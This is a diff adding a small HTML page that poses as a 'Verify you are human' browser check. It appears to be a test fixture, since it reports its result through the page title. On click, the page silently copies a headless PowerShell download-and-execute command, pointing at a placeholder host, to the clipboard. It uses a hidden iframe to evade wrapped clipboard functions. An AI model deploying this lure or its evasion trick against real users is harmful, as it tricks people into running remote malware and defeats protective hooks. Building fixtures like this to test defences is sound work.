@@ -1,0 +1,31 @@
+<!doctype html>
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <title>Checking your browser</title>
+  </head>
+  <body>
+    <label><input type="checkbox" id="cb" /> Verify you are human</label>
+    <script>
+      // Tries to dodge wrapped functions by borrowing a clean copy from a fresh frame.
+      const frame = document.createElement('iframe');
+      frame.style.display = 'none';
+      document.body.appendChild(frame);
+      const clean = frame.contentWindow.navigator.clipboard;
+      const payload = 'conhost --headless powershell -c "irm https://x.example.invalid/a | iex"';
+      document.getElementById('cb').addEventListener('click', async () => {
+        try {
+          await clean.writeText.call(navigator.clipboard, payload);
+          document.title = 'written';
+        } catch (e) {
+          try {
+            await clean.writeText(payload);
+            document.title = 'written via frame';
+          } catch (e2) {
+            document.title = 'error ' + e2;
+          }
+        }
+      });
+    </script>
+  </body>
+</html>
